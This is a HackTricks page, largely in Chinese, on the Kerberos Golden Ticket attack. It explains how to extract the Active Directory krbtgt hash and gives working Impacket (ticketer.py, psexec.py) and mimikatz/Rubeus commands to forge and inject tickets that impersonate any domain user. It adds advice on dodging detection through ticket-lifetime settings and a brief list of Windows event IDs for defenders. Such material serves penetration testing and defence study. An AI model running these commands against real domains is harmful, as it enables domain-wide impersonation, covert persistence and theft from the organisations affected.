# Golden Ticket

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Golden ticket

**Golden Ticket** 攻击是指通过使用 **Active Directory (AD) krbtgt 账户的 NTLM 哈希** 来 **创建一个合法的票据授权票据 (TGT)，冒充任何用户**。这种技术特别有利，因为它 **使冒充的用户能够访问域内的任何服务或机器**。重要的是要记住，**krbtgt 账户的凭据从不自动更新**。

要 **获取 krbtgt 账户的 NTLM 哈希**，可以采用多种方法。它可以从 **本地安全授权子系统服务 (LSASS) 进程** 或位于域内任何域控制器 (DC) 上的 **NT 目录服务 (NTDS.dit) 文件** 中提取。此外，**执行 DCsync 攻击** 是获取此 NTLM 哈希的另一种策略，可以使用 Mimikatz 中的 **lsadump::dcsync 模块** 或 Impacket 的 **secretsdump.py 脚本** 来执行。需要强调的是，进行这些操作通常需要 **域管理员权限或类似级别的访问权限**。

尽管 NTLM 哈希作为此目的的有效方法，但 **强烈建议** 为了操作安全的原因，**使用高级加密标准 (AES) Kerberos 密钥 (AES128 和 AES256) 来伪造票据**。 

{% code title="From Linux" %}
```bash
python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurus
export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
```
{% endcode %}

{% code title="来自Windows" %}
```bash
#mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
.\Rubeus.exe ptt /ticket:ticket.kirbi
klist #List tickets in memory

# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi
```
{% endcode %}

**一旦**你注入了**金票**，你可以访问共享文件**(C$)**，并执行服务和WMI，因此你可以使用**psexec**或**wmiexec**来获取一个shell（看起来你无法通过winrm获取shell）。

### 绕过常见检测

检测金票的最常见方法是**检查网络上的Kerberos流量**。默认情况下，Mimikatz**将TGT签名为10年**，这将在后续使用它的TGS请求中显得异常。

`Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`

使用`/startoffset`、`/endin`和`/renewmax`参数来控制开始偏移、持续时间和最大续订（均以分钟为单位）。
```
Get-DomainPolicy | select -expand KerberosPolicy
```
不幸的是，TGT的生命周期没有记录在4769中，因此您无法在Windows事件日志中找到此信息。然而，您可以关联的是**看到4769而没有先前的4768**。**没有TGT就无法请求TGS**，如果没有TGT被发出的记录，我们可以推断它是离线伪造的。

为了**绕过此检测**，请检查diamond tickets：

{% content-ref url="diamond-ticket.md" %}
[diamond-ticket.md](diamond-ticket.md)
{% endcontent-ref %}

### 缓解措施

* 4624: 账户登录
* 4672: 管理员登录
* `Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property`

防御者可以做的其他小技巧是**对敏感用户的4769进行警报**，例如默认域管理员账户。

## 参考文献
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets)

{% hint style="success" %}
学习和实践AWS黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习和实践GCP黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持HackTricks</summary>

* 查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或**在** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**上关注我们。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub库提交PR分享黑客技巧。

</details>
{% endhint %}
